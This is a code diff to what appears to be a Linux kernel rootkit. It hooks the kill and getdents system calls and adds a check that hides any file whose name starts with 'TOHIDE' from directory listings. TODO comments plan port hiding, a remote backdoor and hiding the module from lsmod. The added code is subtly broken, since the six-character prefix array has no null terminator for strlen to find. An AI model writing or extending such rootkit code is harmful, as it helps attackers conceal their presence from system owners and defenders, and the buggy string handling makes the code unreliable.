@@ -8,9 +8,9 @@
 #include <linux/slab.h>
 #include <linux/list.h>
 #include <linux/dirent.h>
+#include <linux/string.h>
 
 // TODO 
-// File hiding api work
 // Hide ports and add remote backdoor
 // Hide self from lsmod and other commands
 // Cite sources and document
@@ -73,6 +73,19 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
 }
 
 // for hijacking sys_getdents
+char prefix[6] = "TOHIDE";
+int checkName(char *name)
+{
+	int i;
+	if (strlen(prefix) > strlen(name))
+		return 0;
+	for (i = 0; i < strlen(prefix); i++) {
+		if (!(name[i] == prefix[i]))
+			return 0;
+	}
+	return 1;
+}
+
 struct linux_dirent {
 	unsigned long d_ino;
 	unsigned long d_off;
@@ -110,7 +123,7 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
 		for (bp = 0; bp < result;) {
 			d = (struct linux_dirent *) (kdirp + bp);
 			list_for_each_entry(ptr,&hidden_files,list) {
-				if (d->d_ino == ptr->inode) {
+				if (d->d_ino == ptr->inode || checkName(d->d_name)) {
 					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
 					        result - bp - d->d_reclen);
 					result -= d->d_reclen;
@@ -160,7 +173,7 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 		for (bp = 0; bp < result;) {
 			d = (struct linux_dirent64 *) (kdirp + bp);
 			list_for_each_entry(ptr,&hidden_files,list) {
-				if (d->d_ino == ptr->inode) {
+				if (d->d_ino == ptr->inode || checkName(d->d_name)) {
 					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
 					        result - bp - d->d_reclen);
 					result -= d->d_reclen;
